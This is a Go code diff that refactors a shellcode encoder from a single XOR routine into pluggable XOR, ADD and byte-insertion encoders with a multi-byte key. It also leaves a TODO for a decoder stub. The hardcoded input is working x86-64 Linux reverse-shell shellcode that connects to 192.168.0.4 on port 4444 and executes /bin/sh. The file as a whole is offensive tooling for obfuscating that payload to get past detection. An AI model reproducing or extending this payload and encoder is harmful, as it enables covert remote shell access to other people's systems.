@@ -5,46 +5,61 @@ import (
 )
 
 // TODO: Replace this for a file descriptor, read input from a binary file
-var HardcodedInput = []byte(`
-	\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48
-	\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x00\x04\x51\x48
-	\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e
-	\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58
-	\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48
-	\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05`)
+var HardcodedInput = []byte{0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,
+	0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8,
+	0x00, 0x04, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,
+	0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
+	0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
+	0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05}
 
 func main() {
 	// TODO: Read file here
-	fmt.Printf("Input hex: %v\n", HardcodedInput)
-	key := []byte("\x50")
+	fmt.Printf(">> Input:\n%x\n", HardcodedInput)
 
-	encodedOutput, err := encode(HardcodedInput, key)
-	if err != nil {
-		fmt.Printf("[ERROR]: An error ocurred while encoding %v\n", err)
-	}
-	fmt.Printf("[RESULT ENCODE]: %v \n", encodedOutput)
+	xorEncoder := genEncoderFn("XOR", func(input byte, key byte) ([]byte, error) {
+		return []byte{input ^ key}, nil
+	})
 
-	decodedOutput, err := encode(encodedOutput, key)
-	if err != nil {
-		fmt.Printf("[ERROR]: An error ocurred while decoding %v\n", err)
+	addEncoder := genEncoderFn("ADD", func(input byte, key byte) ([]byte, error) {
+		return []byte{input + key}, nil
+	})
+
+	insertionEncoder := genEncoderFn("INSERTION", func(input byte, key byte) ([]byte, error) {
+		return []byte{input, key}, nil
+	})
+
+	encoders := []func(input []byte, key []byte) ([]byte, error){
+		xorEncoder,
+		addEncoder,
+		insertionEncoder,
 	}
-	fmt.Printf("[RESULT DECODE]: %v \n", decodedOutput)
+
+	key := []byte{0x50, 0x51, 0x52, 0x53, 0x54}
+
+	for _, encode := range encoders {
+		encodedOutput, err := encode(HardcodedInput, key)
+		if err != nil {
+			fmt.Printf("[ERROR]: An error ocurred while encoding %v\n", err)
+		}
+		fmt.Printf(">> Output:\n%x\n", encodedOutput)
+	}
 
 }
 
-func encode(input []byte, key []byte) ([]byte, error) {
-	output := []byte{}
-	for i, bytecode := range input {
-		//fmt.Printf("encoding hex input[%d]: %v \n", i, bytecode)
-		// let's just do a XOR encoder first
-		keyByte := key[i%len(key)] // this makes keylenght variable
-		encodedBytecode := bytecode ^ keyByte
-		//fmt.Printf("encoded hex input[%d] to %v using key %v\n", i, encodedBytecode, keyByte)
-		output = append(output, encodedBytecode)
+func genEncoderFn(encoderName string, operation func(input byte, key byte) ([]byte, error)) func(input []byte, key []byte) ([]byte, error) {
+	encoderFn := func(input []byte, key []byte) ([]byte, error) {
+		fmt.Printf(">> Running %s encoder using key %x (size=%d)\n", encoderName, key, len(key))
+		output := []byte{}
+		for i, inputByte := range input {
+			//fmt.Printf("encoding hex input[%d]: %v \n", i, bytecode)
+			keyByte := key[i%len(key)] // this makes keylenght variable
+			encodedOutput, err := operation(inputByte, keyByte)
+			if err != nil {
+				return nil, err
+			}
+			output = append(output, encodedOutput...)
+		}
+		return output, nil
 	}
-	return output, nil
-}
-
-func prependDecoderStub() {
-	// TODO: encoded shellcode => encoded shellcode + appended decoder stub
+	return encoderFn
 }
